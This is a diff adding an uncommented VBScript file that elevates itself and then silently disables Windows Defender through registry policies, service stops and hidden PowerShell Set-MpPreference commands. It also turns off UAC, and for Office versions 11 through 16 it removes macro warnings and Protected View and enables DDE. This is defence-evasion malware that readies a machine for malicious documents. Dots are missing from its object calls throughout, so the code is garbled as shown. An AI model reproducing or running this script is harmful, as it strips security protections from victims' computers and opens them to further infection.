@@ -1,0 +1,325 @@
+If Not WScriptArgumentsNamedExists("elevate") Then
+
+  CreateObject("ShellApplication")ShellExecute WScriptFullName _
+
+    , """" & WScriptScriptFullName & """ /elevate", "", "runas", 1
+
+  WScriptQuit
+
+End If
+
+
+
+On Error Resume Next
+
+Set WshShell = CreateObject("WScriptShell")
+
+WshShellRegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware","1","REG_DWORD"
+
+WshShellRegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
+
+WshShellRegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection","1","REG_DWORD"
+
+WshShellRegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable","1","REG_DWORD"
+
+CreateObject("shellapplication")EXEC "cmd /c net stop WinDefend & net stop WdNisSvc"
+
+WScriptSleep 100
+
+
+
+outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
+
+outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
+
+outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
+
+outputMessage("Set-MpPreference -DisableIOAVProtection $true")
+
+outputMessage("Set-MpPreference -DisableScriptScanning $true")
+
+outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
+
+outputMessage("Set-MpPreference -MAPSReporting 0")
+
+outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
+
+outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
+
+outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
+
+outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")
+
+
+
+
+
+Sub outputMessage(byval args)
+
+On Error Resume Next
+
+Const HIDDEN_WINDOW = 0
+
+strComputer = ""
+
+Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+
+Set objStartup = objWMIServiceGet("Win32_ProcessStartup")
+
+Set objConfig = objStartupSpawnInstance_
+
+objConfigShowWindow = HIDDEN_WINDOW
+
+Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+
+errReturn = objProcessCreate( "powershell " + args, null, objConfig, intProcessID)
+
+
+
+
+
+End Sub
+
+On Error Resume Next
+
+Const HIDDEN_WINDOW = 0
+
+strComputer = ""
+
+Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+
+Set objStartup = objWMIServiceGet("Win32_ProcessStartup")
+
+Set objConfig = objStartupSpawnInstance_
+
+objConfigShowWindow = HIDDEN_WINDOW
+
+Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+
+
+
+CreateObject("WScriptShell")RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA","0", "REG_DWORD"
+
+
+Set wso = CreateObject("WScriptShell")
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Word\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Word\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Word\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Word\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Word\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Publisher\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Publisher\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Publisher\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Publisher\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Publisher\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Publisher\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Publisher\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Publisher\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Publisher\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Publisher\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Publisher\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Publisher\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Publisher\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Publisher\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Publisher\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Publisher\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Publisher\Security\VBAWarnings", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Publisher\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Publisher\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Publisher\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Word\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Word\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Word\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Word\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Word\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\PowerPoint\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\PowerPoint\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\PowerPoint\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\PowerPoint\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\PowerPoint\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Excel\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Excel\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Excel\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Excel\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Excel\Options\DontUpdateLinks", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Word\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Word\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Word\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Word\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Word\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\PowerPoint\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\PowerPoint\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\PowerPoint\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\PowerPoint\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\PowerPoint\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\110\Excel\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\120\Excel\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\140\Excel\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\150\Excel\Security\AllowDDE", 1, "REG_DWORD"
+
+wsoRegWrite "HKCU\Software\Microsoft\Office\160\Excel\Security\AllowDDE", 1, "REG_DWORD"
+
